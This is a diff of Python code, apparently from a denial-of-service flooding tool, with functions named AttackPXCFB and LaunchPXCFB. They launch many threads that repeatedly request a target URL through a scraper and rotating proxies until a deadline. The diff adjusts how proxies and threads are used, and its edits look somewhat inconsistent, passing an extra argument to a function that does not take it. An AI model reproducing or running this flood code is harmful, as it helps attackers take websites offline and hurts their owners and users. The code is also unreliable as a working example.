@@ -562,7 +562,9 @@ def AttackPXCFB(url, until_datetime, scraper,proxies):
 
                     }
 
-                    response = scraper.get(url,headers=headers, proxies=proxies)
+                    # response = scraper.get(url,headers=headers, proxies=proxies)
+                    response = scraper.get(url,headers=headers)
+                    
                     print(response.status_code,proxy_url)
 
                 else:
@@ -586,8 +588,8 @@ def LaunchPXCFB(url, th, t):
 
         for i in range(int(th)):
             try:
-                AttackPXCFB2(url, until, scraper,proxies,th)
-                thd = threading.Thread(target=AttackPXCFB2, args=(url, until, scraper,proxies,th))
+                proxy = random.choice(proxies).strip().split(":")
+                thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper,proxies,th))
                 thd.start()
                
 
@@ -599,7 +601,6 @@ def LaunchPXCFB(url, th, t):
         
 
 def AttackPXCFB2(url, until_datetime, scraper,proxies,th):
-        proxy = random.choice(proxies).strip().split(":")
         driver = None
 
         try:
